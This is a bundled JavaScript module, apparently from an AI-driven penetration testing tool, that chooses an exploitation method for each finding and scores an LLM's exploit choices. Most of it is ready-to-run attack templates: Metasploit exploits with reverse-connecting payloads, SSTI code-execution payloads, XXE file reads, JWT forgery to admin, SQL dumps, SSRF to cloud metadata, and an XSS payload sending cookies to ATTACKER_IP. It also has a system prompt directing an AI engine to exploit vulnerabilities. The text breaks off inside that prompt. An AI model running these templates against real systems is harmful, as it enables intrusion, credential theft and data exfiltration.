import {
  __esm,
  __export
} from "./chunk-KFQGP6VL.js";

// server/lib/exploit-selection-intelligence.ts
var exploit_selection_intelligence_exports = {};
__export(exploit_selection_intelligence_exports, {
  CUSTOM_EXPLOIT_CLI_TEMPLATES: () => CUSTOM_EXPLOIT_CLI_TEMPLATES,
  EXPLOITDB_CLI_TEMPLATES: () => EXPLOITDB_CLI_TEMPLATES,
  EXPLOIT_SELECTION_SYSTEM_PROMPT: () => EXPLOIT_SELECTION_SYSTEM_PROMPT,
  KNOWN_NUCLEI_CVES: () => KNOWN_NUCLEI_CVES,
  MANUAL_VERIFICATION_CLI_TEMPLATES: () => MANUAL_VERIFICATION_CLI_TEMPLATES,
  MSF_CLI_TEMPLATES: () => MSF_CLI_TEMPLATES,
  NUCLEI_CLI_TEMPLATES: () => NUCLEI_CLI_TEMPLATES,
  NUCLEI_VULN_CLASS_TAGS: () => NUCLEI_VULN_CLASS_TAGS,
  buildNucleiCommand: () => buildNucleiCommand,
  scoreExploitSelection: () => scoreExploitSelection,
  selectExploitMethod: () => selectExploitMethod
});
function normalizeRuntimeCriteria(rc) {
  const hasCVE = !!rc.cve;
  const isWebApp = WEB_VULN_CLASSES.has(rc.vulnClass) || /http|https|web/i.test(rc.service) || [80, 443, 8080, 8443, 3e3, 5e3, 8e3].includes(rc.port);
  const hasKnownMSFModule = rc.hasKnownModule || hasCVE && KNOWN_MSF_CVES.has(rc.cve);
  const fpExploitAvailable = rc.fingerprint?.exploitAvailable ?? false;
  const fpKevListed = rc.fingerprint?.kevListed ?? false;
  const hasExploitDBEntry = fpExploitAvailable || hasCVE;
  const complexity = rc.vulnClass === "deserialization" || rc.vulnClass === "ssti" ? "high" : rc.vulnClass === "sqli" || rc.vulnClass === "cmdi" ? "medium" : "low";
  const fpConfirmed = rc.fingerprint?.corroborationTier === "confirmed";
  const reliability = hasKnownMSFModule ? "high" : fpConfirmed || fpKevListed ? "high" : fpExploitAvailable ? "medium" : hasCVE ? "medium" : "low";
  return {
    hasCVE,
    hasKnownMSFModule,
    hasExploitDBEntry,
    vulnCategory: rc.vulnClass,
    targetStack: rc.technologies,
    isWebApp,
    requiresAuthentication: rc.vulnClass === "auth_bypass",
    requiresCustomPayload: rc.vulnClass === "deserialization",
    complexity,
    reliability
  };
}
function selectExploitMethod(criteria) {
  const c = "hasCVE" in criteria ? criteria : normalizeRuntimeCriteria(criteria);
  const rc = !("hasCVE" in criteria) ? criteria : void 0;
  if (rc?.fingerprint?.kevListed && c.hasKnownMSFModule) {
    return "metasploit";
  }
  if (c.hasKnownMSFModule && c.reliability !== "low") {
    return "metasploit";
  }
  if (rc?.fingerprint?.exploitAvailable && rc?.cve && KNOWN_MSF_CVES.has(rc.cve)) {
    return "metasploit";
  }
  if (c.hasCVE && !c.hasKnownMSFModule && rc?.cve) {
    if (KNOWN_NUCLEI_CVES[rc.cve]) {
      return "nuclei";
    }
    if (rc?.fingerprint?.vulnFeedCves) {
      for (const feedCve of rc.fingerprint.vulnFeedCves) {
        if (KNOWN_NUCLEI_CVES[feedCve]) return "nuclei";
      }
    }
  }
  if (c.isWebApp && !c.hasKnownMSFModule && NUCLEI_VULN_CLASS_TAGS[c.vulnCategory]) {
    return "nuclei";
  }
  if (c.hasCVE && c.hasExploitDBEntry && !c.hasKnownMSFModule) {
    return "exploitdb";
  }
  if (c.isWebApp && !c.hasCVE && c.vulnCategory !== "Security Misconfiguration" && !NUCLEI_VULN_CLASS_TAGS[c.vulnCategory]) {
    return "custom";
  }
  if (c.requiresCustomPayload || c.complexity === "high") {
    return "custom";
  }
  if (c.hasCVE && !c.hasKnownMSFModule) {
    return "exploitdb";
  }
  if (c.vulnCategory === "Security Misconfiguration") {
    return "manual_verification";
  }
  return "custom";
}
function buildNucleiCommand(params) {
  const { target, port, cve, vulnClass, cookie } = params;
  const url = `${target}:${port}`;
  if (cve && KNOWN_NUCLEI_CVES[cve]) {
    const template = KNOWN_NUCLEI_CVES[cve];
    const cmd = cookie ? `nuclei -u ${url} -t ${template} -severity critical,high,medium -H "Cookie: ${cookie}" -timeout 45 -no-color 2>&1 | head -100` : `nuclei -u ${url} -t ${template} -severity critical,high,medium -timeout 45 -no-color 2>&1 | head -100`;
    return { command: cmd, templateInfo: `CVE template: ${template}`, tags: [cve] };
  }
  const tags = NUCLEI_VULN_CLASS_TAGS[vulnClass];
  if (tags && tags.length > 0) {
    const cmd = cookie ? `nuclei -u ${url} -tags ${tags.join(",")} -severity critical,high,medium -H "Cookie: ${cookie}" -timeout 45 -no-color 2>&1 | head -100` : `nuclei -u ${url} -tags ${tags.join(",")} -severity critical,high,medium -timeout 45 -no-color 2>&1 | head -100`;
    return { command: cmd, templateInfo: `Vuln class tags: ${tags.join(", ")}`, tags };
  }
  if (cve) {
    const cveTag = cve.toLowerCase().replace(/-/g, "");
    const cmd = `nuclei -u ${url} -tags ${cveTag} -severity critical,high -timeout 30 -no-color 2>&1 | head -50`;
    return { command: cmd, templateInfo: `Generic CVE tag: ${cveTag}`, tags: [cveTag] };
  }
  return null;
}
function scoreExploitSelection(groundTruth, llmFindings) {
  const details = [];
  let methodCorrect = 0;
  let cliToolCorrect = 0;
  let cliPatternCorrect = 0;
  let scored = 0;
  for (const gt of groundTruth) {
    const match = llmFindings.find((f) => {
      const titleLower = f.title.toLowerCase();
      const gtTitleLower = gt.vulnTitle.toLowerCase();
      const gtWords = gtTitleLower.split(/[\s\-\/]+/).filter((w) => w.length > 2);
      const matchCount = gtWords.filter((w) => titleLower.includes(w)).length;
      return matchCount >= Math.ceil(gtWords.length * 0.5) || titleLower.includes(gtTitleLower) || gtTitleLower.includes(titleLower) || f.category.toLowerCase() === gt.vulnCategory.toLowerCase();
    });
    if (!match) {
      details.push({
        vulnTitle: gt.vulnTitle,
        expectedMethod: gt.correctMethod,
        llmMethod: null,
        methodCorrect: false,
        expectedCLITool: gt.expectedCLITool,
        llmCLITool: null,
        cliToolCorrect: false,
        cliPatternMatch: false,
        notes: "Finding not detected by LLM"
      });
      continue;
    }
    scored++;
    const exploitMethod = match.exploitMethod;
    const llmMethod = exploitMethod?.method;
    const isMethodCorrect = llmMethod === gt.correctMethod || (llmMethod ? gt.alternativeAcceptableMethods.includes(llmMethod) : false);
    if (isMethodCorrect) methodCorrect++;
    const llmTool = exploitMethod?.primaryTool || exploitMethod?.cliCommands?.[0]?.tool || null;
    const isToolCorrect = llmTool?.toLowerCase() === gt.expectedCLITool.toLowerCase();
    if (isToolCorrect) cliToolCorrect++;
    let isPatternMatch = false;
    if (exploitMethod?.cliCommands && exploitMethod.cliCommands.length > 0) {
      const allCommands = exploitMethod.cliCommands.map((c) => c.command).join("\n");
      try {
        const pattern = new RegExp(gt.expectedCLIPattern, "i");
        isPatternMatch = pattern.test(allCommands);
      } catch {
        isPatternMatch = false;
      }
    }
    if (isPatternMatch) cliPatternCorrect++;
    details.push({
      vulnTitle: gt.vulnTitle,
      expectedMethod: gt.correctMethod,
      llmMethod: llmMethod || null,
      methodCorrect: isMethodCorrect,
      expectedCLITool: gt.expectedCLITool,
      llmCLITool: llmTool,
      cliToolCorrect: isToolCorrect,
      cliPatternMatch: isPatternMatch,
      notes: isMethodCorrect ? "Correct method selected" : `Expected ${gt.correctMethod}, got ${llmMethod || "none"}`
    });
  }
  const methodAccuracy = scored > 0 ? methodCorrect / scored : 0;
  const cliToolAccuracy = scored > 0 ? cliToolCorrect / scored : 0;
  const cliPatternAccuracy = scored > 0 ? cliPatternCorrect / scored : 0;
  const overallScore = methodAccuracy * 0.5 + cliToolAccuracy * 0.25 + cliPatternAccuracy * 0.25;
  return {
    totalFindings: groundTruth.length,
    scoredFindings: scored,
    methodCorrect,
    methodAccuracy,
    cliToolCorrect,
    cliToolAccuracy,
    cliPatternCorrect,
    cliPatternAccuracy,
    overallScore,
    details
  };
}
var WEB_VULN_CLASSES, KNOWN_NUCLEI_CVES, NUCLEI_VULN_CLASS_TAGS, KNOWN_MSF_CVES, MSF_CLI_TEMPLATES, EXPLOITDB_CLI_TEMPLATES, CUSTOM_EXPLOIT_CLI_TEMPLATES, MANUAL_VERIFICATION_CLI_TEMPLATES, NUCLEI_CLI_TEMPLATES, EXPLOIT_SELECTION_SYSTEM_PROMPT;
var init_exploit_selection_intelligence = __esm({
  "server/lib/exploit-selection-intelligence.ts"() {
    WEB_VULN_CLASSES = /* @__PURE__ */ new Set(["sqli", "xss", "ssrf", "cmdi", "ssti", "lfi", "file_upload", "auth_bypass", "deserialization"]);
    KNOWN_NUCLEI_CVES = {
      // Web application CVEs
      "CVE-2021-44228": "cves/2021/CVE-2021-44228",
      // Log4Shell
      "CVE-2021-41773": "cves/2021/CVE-2021-41773",
      // Apache path traversal
      "CVE-2021-42013": "cves/2021/CVE-2021-42013",
      // Apache path traversal RCE
      "CVE-2022-22965": "cves/2022/CVE-2022-22965",
      // Spring4Shell
      "CVE-2023-44487": "cves/2023/CVE-2023-44487",
      // HTTP/2 Rapid Reset
      "CVE-2018-7600": "cves/2018/CVE-2018-7600",
      // Drupalgeddon2
      "CVE-2019-19781": "cves/2019/CVE-2019-19781",
      // Citrix ADC
      "CVE-2020-14882": "cves/2020/CVE-2020-14882",
      // Oracle WebLogic
      "CVE-2021-26855": "cves/2021/CVE-2021-26855",
      // ProxyLogon
      "CVE-2021-34473": "cves/2021/CVE-2021-34473",
      // ProxyShell
      "CVE-2023-22515": "cves/2023/CVE-2023-22515",
      // Confluence auth bypass
      "CVE-2023-46747": "cves/2023/CVE-2023-46747",
      // F5 BIG-IP RCE
      "CVE-2024-21887": "cves/2024/CVE-2024-21887",
      // Ivanti Connect Secure
      "CVE-2023-27997": "cves/2023/CVE-2023-27997",
      // FortiOS heap overflow
      "CVE-2014-0160": "cves/2014/CVE-2014-0160",
      // Heartbleed
      "CVE-2014-6271": "cves/2014/CVE-2014-6271",
      // Shellshock
      "CVE-2017-9841": "cves/2017/CVE-2017-9841",
      // PHPUnit RCE
      "CVE-2015-1635": "cves/2015/CVE-2015-1635",
      // MS15-034 HTTP.sys
      "CVE-2017-5638": "cves/2017/CVE-2017-5638",
      // Apache Struts2
      "CVE-2020-0688": "cves/2020/CVE-2020-0688",
      // Exchange RCE
      // Metasploitable3 Linux CVEs with Nuclei templates
      "CVE-2015-3306": "cves/2015/CVE-2015-3306",
      // ProFTPD mod_copy
      "CVE-2014-3120": "cves/2014/CVE-2014-3120",
      // Elasticsearch RCE
      "CVE-2015-1427": "cves/2015/CVE-2015-1427",
      // Elasticsearch Groovy sandbox
      "CVE-2012-1823": "cves/2012/CVE-2012-1823",
      // PHP-CGI argument injection
      "CVE-2014-6278": "cves/2014/CVE-2014-6278",
      // Shellshock variant
      "CVE-2016-3714": "cves/2016/CVE-2016-3714",
      // ImageMagick RCE
      // Metasploitable3 Windows CVEs with Nuclei templates
      "CVE-2009-1535": "cves/2009/CVE-2009-1535"
      // IIS WebDAV auth bypass
    };
    NUCLEI_VULN_CLASS_TAGS = {
      sqli: ["sqli", "sql-injection"],
      xss: ["xss", "cross-site-scripting"],
      ssrf: ["ssrf"],
      cmdi: ["rce", "command-injection"],
      ssti: ["ssti", "template-injection"],
      lfi: ["lfi", "local-file-inclusion", "path-traversal"],
      file_upload: ["fileupload", "file-upload"],
      auth_bypass: ["auth-bypass", "default-login"],
      deserialization: ["deserialization", "rce"],
      generic: ["cve", "rce", "critical"]
    };
    KNOWN_MSF_CVES = /* @__PURE__ */ new Set([
      "CVE-2017-5638",
      "CVE-2021-44228",
      "CVE-2019-0708",
      "CVE-2017-0144",
      "CVE-2021-26855",
      "CVE-2020-1472",
      "CVE-2021-34527",
      "CVE-2018-7600",
      "CVE-2019-19781",
      "CVE-2020-0688",
      "CVE-2021-21972",
      "CVE-2021-22986",
      "CVE-2017-10271",
      "CVE-2019-2725",
      "CVE-2020-14882",
      "CVE-2021-3156",
      "CVE-2021-41773",
      "CVE-2021-42013",
      "CVE-2022-22965",
      "CVE-2023-44487",
      // Metasploitable3 Linux CVEs (ProFTPD, Samba, Elasticsearch, PHP-CGI, Shellshock, etc.)
      "CVE-2015-3306",
      "CVE-2007-2447",
      "CVE-2014-3120",
      "CVE-2015-1427",
      "CVE-2012-1823",
      "CVE-2014-6271",
      "CVE-2014-6278",
      "CVE-2010-1240",
      "CVE-2015-5119",
      "CVE-2008-0166",
      "CVE-2016-6515",
      "CVE-2010-0426",
      "CVE-2014-0160",
      "CVE-2016-3714",
      "CVE-2015-7547",
      // Metasploitable3 Windows CVEs (MS08-067, MS17-010, IIS WebDAV, etc.)
      "CVE-2008-4250",
      "CVE-2017-0143",
      "CVE-2017-0145",
      "CVE-2017-0146",
      "CVE-2009-3103",
      "CVE-2003-0352",
      "CVE-2009-1535",
      "CVE-2015-1635",
      "CVE-2014-1812",
      "CVE-2016-0099",
      "CVE-2010-3338",
      "CVE-2013-1300"
    ]);
    MSF_CLI_TEMPLATES = {
      /** Basic exploit execution */
      basicExploit: (module, rhosts, rport, payload, lhost, lport) => [
        {
          order: 1,
          tool: "msfconsole",
          command: `msfconsole -q -x "use ${module}; set RHOSTS ${rhosts}; set RPORT ${rport}; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; check"`,
          description: "Load module, configure options, and run vulnerability check",
          expectedOutput: "The target appears to be vulnerable",
          isInteractive: false,
          timeout: 60
        },
        {
          order: 2,
          tool: "msfconsole",
          command: `msfconsole -q -x "use ${module}; set RHOSTS ${rhosts}; set RPORT ${rport}; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; exploit -j"`,
          description: "Execute the exploit in background job mode",
          expectedOutput: "Session opened",
          isInteractive: false,
          timeout: 120
        }
      ],
      /** Resource script for batch exploitation */
      resourceScript: (module, rhosts, rport, payload, lhost, lport) => [
        {
          order: 1,
          tool: "bash",
          command: `cat > /tmp/exploit.rc << 'EOF'
use ${module}
set RHOSTS ${rhosts}
set RPORT ${rport}
set PAYLOAD ${payload}
set LHOST ${lhost}
set LPORT ${lport}
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j
EOF`,
          description: "Generate Metasploit resource script",
          expectedOutput: "Resource script created at /tmp/exploit.rc",
          isInteractive: false
        },
        {
          order: 2,
          tool: "msfconsole",
          command: "msfconsole -q -r /tmp/exploit.rc",
          description: "Execute the resource script",
          expectedOutput: "Session opened",
          isInteractive: false,
          timeout: 120
        }
      ],
      /** Module search */
      searchModule: (searchTerm) => [
        {
          order: 1,
          tool: "msfconsole",
          command: `msfconsole -q -x "search ${searchTerm}; exit"`,
          description: `Search Metasploit for modules matching '${searchTerm}'`,
          expectedOutput: "Matching Modules listing",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** Auxiliary scanner */
      auxiliaryScan: (module, rhosts, rport) => [
        {
          order: 1,
          tool: "msfconsole",
          command: `msfconsole -q -x "use ${module}; set RHOSTS ${rhosts}; set RPORT ${rport}; run; exit"`,
          description: `Run auxiliary scanner: ${module}`,
          expectedOutput: "Scan results",
          isInteractive: false,
          timeout: 60
        }
      ],
      /** Post-exploitation evidence gathering */
      postExploit: (sessionId) => [
        {
          order: 1,
          tool: "msfconsole",
          command: `msfconsole -q -x "sessions -i ${sessionId} -c 'sysinfo'; sessions -i ${sessionId} -c 'getuid'; sessions -i ${sessionId} -c 'ipconfig'"`,
          description: "Gather system info from active session",
          expectedOutput: "System information, user context, network config",
          isInteractive: false,
          timeout: 30
        }
      ]
    };
    EXPLOITDB_CLI_TEMPLATES = {
      /** Search for exploits by keyword */
      search: (keyword) => [
        {
          order: 1,
          tool: "searchsploit",
          command: `searchsploit "${keyword}" --json`,
          description: `Search ExploitDB for '${keyword}'`,
          expectedOutput: "JSON array of matching exploits with EDB-IDs",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Search by CVE */
      searchByCVE: (cve) => [
        {
          order: 1,
          tool: "searchsploit",
          command: `searchsploit --cve "${cve.replace("CVE-", "")}" --json`,
          description: `Search ExploitDB for CVE ${cve}`,
          expectedOutput: "Matching exploits for the CVE",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Mirror (download) an exploit */
      mirror: (edbId, outputDir = "/tmp/exploits") => [
        {
          order: 1,
          tool: "bash",
          command: `mkdir -p ${outputDir}`,
          description: "Create exploit output directory",
          expectedOutput: "Directory created",
          isInteractive: false
        },
        {
          order: 2,
          tool: "searchsploit",
          command: `searchsploit -m ${edbId} -d ${outputDir}`,
          description: `Download exploit EDB-${edbId} to ${outputDir}`,
          expectedOutput: "Exploit copied to output directory",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Examine and compile a C exploit */
      compileC: (exploitPath, outputBinary) => [
        {
          order: 1,
          tool: "bash",
          command: `head -50 ${exploitPath}`,
          description: "Review exploit source code header for compilation instructions",
          expectedOutput: "Source code with compilation hints in comments",
          isInteractive: false
        },
        {
          order: 2,
          tool: "gcc",
          command: `gcc -o ${outputBinary} ${exploitPath} -lpthread -lcrypto 2>&1`,
          description: "Compile the exploit",
          expectedOutput: "Compilation successful (no errors)",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** Run a Python exploit from ExploitDB */
      runPython: (exploitPath, targetArgs) => [
        {
          order: 1,
          tool: "bash",
          command: `head -30 ${exploitPath}`,
          description: "Review exploit for dependencies and usage",
          expectedOutput: "Usage instructions and required arguments",
          isInteractive: false
        },
        {
          order: 2,
          tool: "bash",
          command: `pip3 install -r <(grep -oP "(?<=import )\\w+" ${exploitPath} | sort -u) 2>/dev/null; true`,
          description: "Install any missing Python dependencies",
          expectedOutput: "Dependencies installed",
          isInteractive: false,
          timeout: 30
        },
        {
          order: 3,
          tool: "python3",
          command: `python3 ${exploitPath} ${targetArgs}`,
          description: "Execute the ExploitDB exploit",
          expectedOutput: "Exploit execution output",
          isInteractive: false,
          timeout: 120
        }
      ]
    };
    CUSTOM_EXPLOIT_CLI_TEMPLATES = {
      /** SQL Injection exploitation */
      sqlInjection: (targetUrl, paramName, dbms = "mysql") => [
        {
          order: 1,
          tool: "sqlmap",
          command: `sqlmap -u "${targetUrl}" -p "${paramName}" --dbms=${dbms} --batch --level=3 --risk=2 --dump --output-dir=/tmp/sqlmap_output`,
          description: `Automated SQL injection exploitation against ${paramName} parameter`,
          expectedOutput: "Database contents dumped",
          isInteractive: false,
          timeout: 300
        }
      ],
      /** SQL Injection with custom payload */
      sqlInjectionManual: (targetUrl, payload) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" --data-urlencode "${payload}" -o /tmp/sqli_response.html`,
          description: "Send manual SQL injection payload",
          expectedOutput: "Response with injected data",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** Command Injection */
      commandInjection: (targetUrl, paramName, command) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k -X POST "${targetUrl}" -d '${paramName}=127.0.0.1;${command}' -H "Content-Type: application/x-www-form-urlencoded"`,
          description: `Command injection via ${paramName} parameter`,
          expectedOutput: "Command output in response body",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** SSTI (Server-Side Template Injection) */
      ssti: (targetUrl, paramName, engine = "jinja2") => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" --data-urlencode "${paramName}={{7*7}}"`,
          description: "Test for SSTI with arithmetic payload",
          expectedOutput: "Response containing '49' confirms SSTI",
          isInteractive: false,
          timeout: 15
        },
        {
          order: 2,
          tool: "python3",
          command: `python3 -c "
import requests
# SSTI RCE payload for ${engine}
payloads = {
    'jinja2': '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
    'twig': '{{["/usr/bin/id"]|filter("exec")}}',
    'freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}',
    'pug': 'p=\\'require("child_process").execSync("id")\\''
}
payload = payloads.get('${engine}', payloads['jinja2'])
r = requests.post('${targetUrl}', data={'${paramName}': payload}, verify=False)
print(r.text)
"`,
          description: `SSTI RCE exploitation for ${engine} template engine`,
          expectedOutput: "Command execution output (uid, gid)",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** XXE (XML External Entity) */
      xxe: (targetUrl, contentType = "application/xml") => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k -X POST "${targetUrl}" -H "Content-Type: ${contentType}" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'`,
          description: "XXE file read exploitation",
          expectedOutput: "Contents of /etc/passwd in response",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** JWT None Algorithm Bypass */
      jwtBypass: (targetUrl, originalToken) => [
        {
          order: 1,
          tool: "python3",
          command: `python3 -c "
import base64, json
# Decode and forge JWT with 'none' algorithm
parts = '${originalToken}'.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
header['alg'] = 'none'
payload['role'] = 'admin'
forged_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
forged_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
forged_token = f'{forged_header}.{forged_payload}.'
print(f'Forged token: {forged_token}')
"`,
          description: "Forge JWT token with 'none' algorithm",
          expectedOutput: "Forged JWT token with admin role",
          isInteractive: false,
          timeout: 10
        },
        {
          order: 2,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" -H "Authorization: Bearer <FORGED_TOKEN>"`,
          description: "Test forged JWT against protected endpoint",
          expectedOutput: "Access granted with forged token",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** File Inclusion (LFI/RFI) */
      fileInclusion: (targetUrl, paramName) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k "${targetUrl}?${paramName}=../../../../etc/passwd"`,
          description: "Local File Inclusion \u2014 read /etc/passwd",
          expectedOutput: "Contents of /etc/passwd",
          isInteractive: false,
          timeout: 15
        },
        {
          order: 2,
          tool: "curl",
          command: `curl -s -k "${targetUrl}?${paramName}=php://filter/convert.base64-encode/resource=index.php"`,
          description: "PHP filter wrapper to read source code",
          expectedOutput: "Base64-encoded PHP source code",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** XSS Proof of Concept */
      xssProof: (targetUrl, paramName) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" --data-urlencode '${paramName}=<script>document.location="http://ATTACKER_IP:8888/steal?c="+document.cookie</script>'`,
          description: "Inject XSS payload to steal cookies",
          expectedOutput: "Payload reflected in response without sanitization",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** SSRF exploitation */
      ssrf: (targetUrl, paramName) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" --data-urlencode '${paramName}=http://169.254.169.254/latest/meta-data/'`,
          description: "SSRF to AWS metadata endpoint",
          expectedOutput: "AWS metadata listing",
          isInteractive: false,
          timeout: 15
        },
        {
          order: 2,
          tool: "curl",
          command: `curl -s -k "${targetUrl}" --data-urlencode '${paramName}=http://127.0.0.1:6379/INFO'`,
          description: "SSRF to internal Redis",
          expectedOutput: "Redis server info",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Custom Python exploit script */
      customPythonExploit: (scriptContent, scriptName = "exploit.py") => [
        {
          order: 1,
          tool: "bash",
          command: `cat > /tmp/${scriptName} << 'EXPLOIT_EOF'
${scriptContent}
EXPLOIT_EOF`,
          description: "Write custom exploit script",
          expectedOutput: "Script created",
          isInteractive: false
        },
        {
          order: 2,
          tool: "python3",
          command: `python3 /tmp/${scriptName}`,
          description: "Execute custom exploit",
          expectedOutput: "Exploit execution output",
          isInteractive: false,
          timeout: 120
        }
      ],
      /** Custom bash exploit */
      customBashExploit: (scriptContent, scriptName = "exploit.sh") => [
        {
          order: 1,
          tool: "bash",
          command: `cat > /tmp/${scriptName} << 'EXPLOIT_EOF'
${scriptContent}
EXPLOIT_EOF
chmod +x /tmp/${scriptName}`,
          description: "Write and make executable custom bash exploit",
          expectedOutput: "Script created",
          isInteractive: false
        },
        {
          order: 2,
          tool: "bash",
          command: `/tmp/${scriptName}`,
          description: "Execute custom bash exploit",
          expectedOutput: "Exploit execution output",
          isInteractive: false,
          timeout: 120
        }
      ]
    };
    MANUAL_VERIFICATION_CLI_TEMPLATES = {
      /** Check security headers */
      securityHeaders: (targetUrl) => [
        {
          order: 1,
          tool: "curl",
          command: `curl -s -k -I "${targetUrl}" | grep -iE "x-frame-options|content-security-policy|strict-transport|x-content-type|x-xss-protection|referrer-policy|permissions-policy"`,
          description: "Check for missing security headers",
          expectedOutput: "List of present/missing security headers",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Check for exposed files/directories */
      exposedFiles: (targetUrl) => [
        {
          order: 1,
          tool: "curl",
          command: `for path in .git/HEAD .env robots.txt sitemap.xml phpinfo.php server-status server-info wp-config.php.bak; do echo -n "$path: "; curl -s -k -o /dev/null -w "%{http_code}" "${targetUrl}/$path"; echo; done`,
          description: "Check for commonly exposed sensitive files",
          expectedOutput: "HTTP status codes for each path (200 = exposed)",
          isInteractive: false,
          timeout: 30
        }
      ],
      /** SSL/TLS check */
      tlsCheck: (hostname, port = 443) => [
        {
          order: 1,
          tool: "bash",
          command: `echo | openssl s_client -connect ${hostname}:${port} -servername ${hostname} 2>/dev/null | openssl x509 -noout -dates -subject -issuer`,
          description: "Check SSL/TLS certificate details",
          expectedOutput: "Certificate dates, subject, and issuer",
          isInteractive: false,
          timeout: 15
        }
      ],
      /** Default credentials check */
      defaultCredentials: (targetUrl, credentials) => credentials.map((cred, i) => ({
        order: i + 1,
        tool: "curl",
        command: `curl -s -k -X POST "${targetUrl}" -d "username=${cred.user}&password=${cred.pass}" -c /tmp/cookies.txt -L -o /tmp/login_response.html -w "\\nHTTP_CODE:%{http_code}\\nREDIRECT:%{redirect_url}"`,
        description: `Test default credentials: ${cred.user}:${cred.pass}`,
        expectedOutput: "Login success indicators (redirect to dashboard, session cookie set)",
        isInteractive: false,
        timeout: 15
      }))
    };
    NUCLEI_CLI_TEMPLATES = {
      /** Scan by specific CVE template */
      scanByCVE: (target, port, cveTemplate) => [
        {
          order: 1,
          tool: "nuclei",
          command: `nuclei -u ${target}:${port} -t ${cveTemplate} -severity critical,high,medium -timeout 45 -no-color 2>&1 | head -100`,
          description: `Run Nuclei CVE-specific template: ${cveTemplate}`,
          expectedOutput: "Vulnerability confirmed with template match details",
          isInteractive: false,
          timeout: 60
        }
      ],
      /** Scan by vuln class tags */
      scanByTags: (target, port, tags) => [
        {
          order: 1,
          tool: "nuclei",
          command: `nuclei -u ${target}:${port} -tags ${tags.join(",")} -severity critical,high,medium -timeout 45 -no-color 2>&1 | head -100`,
          description: `Run Nuclei tag-based scan: ${tags.join(", ")}`,
          expectedOutput: "Matching vulnerability findings",
          isInteractive: false,
          timeout: 90
        }
      ],
      /** Full web app scan with all relevant templates */
      fullWebScan: (target, port) => [
        {
          order: 1,
          tool: "nuclei",
          command: `nuclei -u ${target}:${port} -severity critical,high -type http -timeout 60 -no-color -stats 2>&1 | head -200`,
          description: "Full Nuclei web application scan (critical + high)",
          expectedOutput: "List of confirmed vulnerabilities",
          isInteractive: false,
          timeout: 180
        }
      ],
      /** Authenticated scan with headers/cookies */
      authenticatedScan: (target, port, tags, cookie) => [
        {
          order: 1,
          tool: "nuclei",
          command: `nuclei -u ${target}:${port} -tags ${tags.join(",")} -severity critical,high,medium -H "Cookie: ${cookie}" -timeout 45 -no-color 2>&1 | head -100`,
          description: `Authenticated Nuclei scan with session cookie`,
          expectedOutput: "Authenticated vulnerability findings",
          isInteractive: false,
          timeout: 90
        }
      ]
    };
    EXPLOIT_SELECTION_SYSTEM_PROMPT = `You are the AC3 Exploit Selection Intelligence engine. For each vulnerability discovered during a pentest, you must decide the optimal exploitation approach.

## EXPLOIT METHOD TAXONOMY

### 1. METASPLOIT (method: "metasploit")
**When to use:**
- A known, reliable Metasploit module exists for the CVE or vulnerability class
- The vulnerability is a well-known service-level exploit (EternalBlue, ProxyShell, Log4Shell, etc.)
- You need automated payload delivery with session management
- Post-exploitation capabilities (Meterpreter) are needed
- The target runs a service with known MSF auxiliary/exploit modules

**CLI Pattern:**
\`\`\`bash
# Search for modules
msfconsole -q -x "search type:exploit <keyword>; exit"

# Run exploit with resource script
cat > /tmp/exploit.rc << 'EOF'
use exploit/path/to/module
set RHOSTS <target>
set RPORT <port>
set PAYLOAD <payload_type>
set LHOST <attacker_ip>
set LPORT <attacker_port>
exploit -j
EOF
msfconsole -q -r /tmp/exploit.rc

# Quick one-liner
msfconsole -q -x "use <module>; set RHOSTS <target>; set RPORT <port>; set PAYLOAD <payload>; set LHOST <lhost>; set LPORT <lport>; exploit -j"
\`\`\`

### 2. NUCLEI (method: "nuclei")
**When to use:**
- A known CVE has a Nuclei template (fast, reliable, low false-positive rate)
- Web application vulnerability classes: SQLi, XSS, SSRF, SSTI, LFI, command injection
- You want fast template-based scanning before heavier tools
- The target is a web application and no MSF module exists
- Authenticated scanning with session cookies is needed
- You want to verify a vulnerability before attempting full exploitation

**CLI Pattern:**
\`\`\`bash
# CVE-specific template
nuclei -u <target>:<port> -t cves/2021/CVE-2021-44228 -severity critical,high,medium -timeout 45 -no-color

# Vuln-class tag scan
nuclei -u <target>:<port> -tags sqli,sql-injection -severity critical,high,medium -timeout 45 -no-color

# Authenticated scan with cookie
nuclei -u <target>:<port> -tags xss -H "Cookie: PHPSESSID=abc123" -timeout 45 -no-color

# Full web app scan
nuclei -u <target>:<port> -severity critical,high -type http -timeout 60 -no-color -stats
\`\`\`

### 3. EXPLOITDB (method: "exploitdb")
**When to use:**
- No reliable MSF module or Nuclei template exists, but a public PoC is available on ExploitDB
